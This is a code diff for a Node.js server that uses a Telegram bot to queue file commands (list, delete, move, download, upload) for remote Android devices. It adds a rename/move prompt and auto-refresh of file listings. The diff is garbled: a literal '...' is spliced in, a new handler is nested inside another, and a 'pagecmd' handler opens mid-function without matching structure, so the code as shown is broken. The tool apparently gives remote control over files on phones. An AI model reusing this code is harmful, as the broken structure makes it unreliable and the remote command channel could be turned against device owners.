@@ -659,11 +659,32 @@ Format Eksekusi Manual:
 
         const menu = [
             [{ text: '📥 Download', callback_data: `runcmd:${devId}:download ${filePath}` }],
-            [{ text: '✏️ Rename / Move', callback_data: `runcmd:${devId}:mv ${filePath}|` }, { text: '🗑 Hapus', callback_data: `runcmd:${devId}:rm ${filePath}`, style: 'danger' }],
+            [{ text: '✏️ Rename / Move', callback_data: `rename_init:${devId}:${shortId}` }, { text: '🗑 Hapus', callback_data: `runcmd:${devId}:rm ${filePath}`, style: 'danger' }],
             [{ text: '🔙 Kembali ke Folder', callback_data: `runcmd:${devId}:ls ${filePath.substring(0, filePath.lastIndexOf('/'))}` }]
         ];
+        ...
+        bot.action(/^rename_init:(.+):(.+)$/, async (ctx) => {
+        const devId = ctx.match[1];
+        const shortId = ctx.match[2];
+        const filePath = pathMap[shortId];
+        if (!filePath) return ctx.answerCbQuery('❌ Sesi kedaluwarsa.');
+
+        activeInput[ctx.chat.id] = { devId, command: 'mv_finish', srcPath: filePath };
+
+        const fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
+        const cancelBtn = {
+            inline_keyboard: [
+                [{ text: '🔙 Batal', callback_data: `file_menu:${devId}:${shortId}` }]
+            ]
+        };
 
         await clearPreviousNav(ctx.chat.id);
+        const sent = await ctx.reply(`✏️ <b>Rename / Move</b>\n\nFile Asal: <code>${escapeHTML(fileName)}</code>\n\nMasukkan nama baru atau path tujuan lengkap:`, { parse_mode: 'HTML', reply_markup: cancelBtn });
+        trackNav(ctx.chat.id, sent.message_id);
+        });
+
+        bot.action(/^pagecmd:(.+):(.+)$/, async (ctx) => {
+
         const sent = await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: menu } });
         trackNav(ctx.chat.id, sent.message_id);
     });
@@ -693,8 +714,21 @@ Format Eksekusi Manual:
         if (ctx.message.text.startsWith('/')) return next();
 
         if (state) {
-            const { devId, command } = state;
-            // NOTE: activeInput[chatId] TIDAK di-delete agar user bisa kirim input berkali-kali (Mode Lengket)
+            let { devId, command, srcPath } = state;
+            let finalPayload = ctx.message.text;
+
+            // Logika Khusus: Selesaikan proses Rename/Move
+            if (command === 'mv_finish') {
+                command = 'mv';
+                let dest = ctx.message.text;
+                // Jika input bukan path absolut (tidak diawali /), anggap itu rename di folder yang sama
+                if (!dest.startsWith('/')) {
+                    const parentDir = srcPath.substring(0, srcPath.lastIndexOf('/'));
+                    dest = parentDir + '/' + dest;
+                }
+                finalPayload = `${srcPath}|${dest}`;
+                delete activeInput[chatId]; // Selesai, hapus state (tidak lengket)
+            }
 
             const cmdId = uuidv4().slice(0, 8);
             const exitBtn = Markup.inlineKeyboard([
@@ -712,9 +746,9 @@ Format Eksekusi Manual:
             const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
             const currentMode = device?.polling_mode || 'normal';
             await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
-                [cmdId, devId, command, ctx.message.text, 'pending', chatId.toString(), sentMsg.message_id.toString(), currentMode]);
+                [cmdId, devId, command, finalPayload, 'pending', chatId.toString(), sentMsg.message_id.toString(), currentMode]);
 
-            notifyClient(devId, { id: cmdId, command: command, text: ctx.message.text });
+            notifyClient(devId, { id: cmdId, command: command, text: finalPayload });
             return;
         }
         return next();
@@ -898,7 +932,7 @@ app.post('/response', async (req, res) => {
 
         // Membalas ke Telegram jika perintah ini dari Telegram
         try {
-            const cmd = await db.get('SELECT chat_id, message_id FROM commands WHERE id = ?', [data.id]);
+            const cmd = await db.get('SELECT chat_id, message_id, command FROM commands WHERE id = ?', [data.id]);
             if (cmd && cmd.chat_id && bot) {
                 const deviceResponse = data.data !== undefined ? data.data : data;
 
@@ -913,6 +947,20 @@ app.post('/response', async (req, res) => {
                         ]
                     }
                 });
+
+                // Helper untuk auto-refresh file list jika perintahnya merubah filesystem
+                const refreshFileList = async () => {
+                    const affectedCmds = ['rm', 'mv', 'upload'];
+                    if (affectedCmds.includes(cmd.command)) {
+                        const currentPath = devicePaths[client_id] || '/storage/emulated/0';
+                        const refreshCmdId = uuidv4().slice(0, 8);
+                        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [client_id]);
+                        const currentMode = device?.polling_mode || 'normal';
+                        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
+                            [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id, currentMode]);
+                        notifyClient(client_id, { id: refreshCmdId, command: 'ls', text: currentPath });
+                    }
+                };
 
                 const sendOrEdit = async (text, options = {}) => {
                     await clearPreviousNav(cmd.chat_id);
@@ -1006,13 +1054,7 @@ app.post('/response', async (req, res) => {
 
                 if (data.type === 'upload_success') {
                     await sendOrEdit(`✅ <b>File berhasil diunggah!</b>\n└ ${escapeHTML(deviceResponse)}`);
-                    // Auto Refresh ls
-                    const currentPath = devicePaths[client_id] || '/storage/emulated/0';
-                    const refreshCmdId = uuidv4().slice(0, 8);
-                    const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [client_id]);
-                    const currentMode = device?.polling_mode || 'normal';
-                    await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                        [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id, currentMode]);
+                    await refreshFileList();
                     return res.json({ status: 'received' });
                 }
 
@@ -1074,6 +1116,11 @@ app.post('/response', async (req, res) => {
                     // Tambahkan pengamanan ekstra: jika formattedDisplay masih mengandung tag mencurigakan (untuk jaga-jaga)
                     const replyMessage = `✅ <b>Respon Eksekusi [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`;
                     await sendOrEdit(replyMessage);
+                    
+                    // Jika ini adalah respon sukses dari operasi file, refresh list
+                    if (data.type === 'success' || data.type === 'error') {
+                        await refreshFileList();
+                    }
                 }
             }
         } catch (err) {
